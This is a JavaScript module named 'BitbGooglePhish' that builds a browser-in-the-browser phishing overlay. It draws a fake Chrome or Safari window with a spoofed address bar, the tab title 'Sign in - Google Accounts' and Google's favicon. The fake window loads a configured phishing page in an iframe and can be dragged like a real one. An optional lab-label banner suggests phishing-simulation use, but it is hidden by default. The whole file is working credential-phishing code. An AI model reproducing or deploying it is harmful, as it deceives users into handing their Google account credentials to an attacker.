(function (global) {
    function cfg() {
        return global.APP_CONFIG || {};
    }

    function normalizeBase(url) {
        if (!url || typeof url !== 'string') return '';
        return url.replace(/\/+$/, '');
    }

    /* ── Browser detection ── */
    function detectBrowser() {
        var ua = navigator.userAgent || '';
        // Safari: has 'Safari' but NOT 'Chrome' or 'Chromium' or 'CriOS'
        if (/Safari/i.test(ua) && !/Chrome|Chromium|CriOS|Edg/i.test(ua)) {
            return 'safari';
        }
        return 'chrome';
    }

    function getOverlay() { return document.getElementById('bitbOverlay'); }

    function getActiveFrame() {
        var overlay = getOverlay();
        if (!overlay) return null;
        var b = overlay.dataset.bitbBrowser || 'chrome';
        return b === 'safari'
            ? document.getElementById('bitbFrameSafari')
            : document.getElementById('bitbFrame');
    }

    function entryPath() {
        var p = String(cfg().bitbEntryPath || '/index.php').trim();
        if (!p.startsWith('/')) p = '/' + p;
        return p;
    }

    /* ── Populate URL bar for both skins ── */
    function populateUrl(displayUrl) {
        var host = displayUrl, path = '';
        try {
            var parsed = new URL(displayUrl);
            host = parsed.host;
            path = parsed.pathname + parsed.search + parsed.hash;
        } catch (_) {}

        // Chrome skin
        var domainEl = document.getElementById('bitbDomainName');
        var pathEl   = document.getElementById('bitbUrlDisplay');
        if (domainEl) domainEl.textContent = host;
        if (pathEl)   pathEl.textContent   = path;

        // Safari skin
        var sDomain = document.getElementById('bitbSafariDomain');
        var sPath   = document.getElementById('bitbSafariPath');
        if (sDomain) sDomain.textContent = host;
        if (sPath)   sPath.textContent   = path;
    }

    function populateTitle(title) {
        var chromeEl = document.getElementById('bitbTabTitleText');
        var safariEl = document.getElementById('bitbSafariTitle');
        if (chromeEl) chromeEl.textContent = title;
        if (safariEl) safariEl.textContent = title;
    }

    function populateFavicon(favUrl) {
        var ids = ['bitbTabFavicon', 'bitbSafariFavicon', 'bitbSafariTabFavicon'];
        ids.forEach(function (id) {
            var el = document.getElementById(id);
            if (el && favUrl) el.src = favUrl;
        });
    }

    function populateLabel(label) {
        ['bitbLabBanner', 'bitbLabBannerSafari'].forEach(function (id) {
            var el = document.getElementById(id);
            if (!el) return;
            if (label) { el.textContent = label; el.hidden = false; }
            else       { el.textContent = '';    el.hidden = true;  }
        });
    }

    function open() {
        var base = normalizeBase(cfg().googlephishBaseUrl);
        if (!base) return false;

        var overlay = getOverlay();
        if (!overlay) return false;

        // Set browser skin
        var browser = detectBrowser();
        overlay.dataset.bitbBrowser = browser;

        var displayUrl = String(cfg().bitbDisplayUrl || base + entryPath()).trim();
        var tabTitle   = String(cfg().bitbTabTitle   || 'Sign in - Google Accounts').trim();
        var fav        = String(cfg().bitbFaviconUrl || 'https://www.google.com/favicon.ico').trim();
        var label      = String(cfg().bitbLabLabel   || '').trim();

        populateUrl(displayUrl);
        populateTitle(tabTitle);
        populateFavicon(fav);
        populateLabel(label);

        // Load iframe for the active skin only
        var frame = getActiveFrame();
        if (frame) frame.src = base + entryPath();

        overlay.hidden = false;
        overlay.setAttribute('aria-hidden', 'false');
        document.body.style.overflow = 'hidden';

        function onKey(e) { if (e.key === 'Escape') close(); }
        overlay._bitbOnKey = onKey;
        document.addEventListener('keydown', onKey);

        return true;
    }

    function close() {
        var overlay = getOverlay();
        if (!overlay) return;

        if (overlay._bitbOnKey) {
            document.removeEventListener('keydown', overlay._bitbOnKey);
            overlay._bitbOnKey = null;
        }

        overlay.hidden = true;
        overlay.setAttribute('aria-hidden', 'true');
        document.body.style.overflow = '';

        // Blank both frames
        ['bitbFrame', 'bitbFrameSafari'].forEach(function (id) {
            var f = document.getElementById(id);
            if (f) f.src = 'about:blank';
        });
    }

    /* ── Make window draggable by title/toolbar bar ── */
    function wireDraggable() {
        var pairs = [
            { win: 'bitbWindow',       bar: 'bitbTitleBar'    },
            { win: 'bitbWindowSafari', bar: null               } // drag by toolbar
        ];

        pairs.forEach(function (p) {
            var win = document.getElementById(p.win);
            if (!win) return;
            var handle = p.bar ? document.getElementById(p.bar) : win.querySelector('.safari-toolbar');
            if (!handle) return;

            var dragging = false, startX, startY, origLeft, origTop;

            handle.addEventListener('mousedown', function (e) {
                if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) return;
                dragging = true;
                startX = e.clientX; startY = e.clientY;
                var r = win.getBoundingClientRect();
                origLeft = r.left; origTop = r.top;
                win.style.position = 'fixed';
                win.style.margin   = '0';
                win.style.left     = origLeft + 'px';
                win.style.top      = origTop  + 'px';
                e.preventDefault();
            });

            document.addEventListener('mousemove', function (e) {
                if (!dragging) return;
                win.style.left = (origLeft + e.clientX - startX) + 'px';
                win.style.top  = (origTop  + e.clientY - startY) + 'px';
            });

            document.addEventListener('mouseup', function () { dragging = false; });
        });
    }

    function wireCloseHandlers() {
        var overlay = getOverlay();
        if (!overlay || overlay.dataset.bitbWired) return;
        overlay.dataset.bitbWired = '1';
        overlay.addEventListener('click', function (e) {
            if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) close();
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () {
            wireCloseHandlers();
            wireDraggable();
        });
    } else {
        wireCloseHandlers();
        wireDraggable();
    }

    global.BitbGooglePhish = { open: open, close: close, normalizeBase: normalizeBase };
})(window);
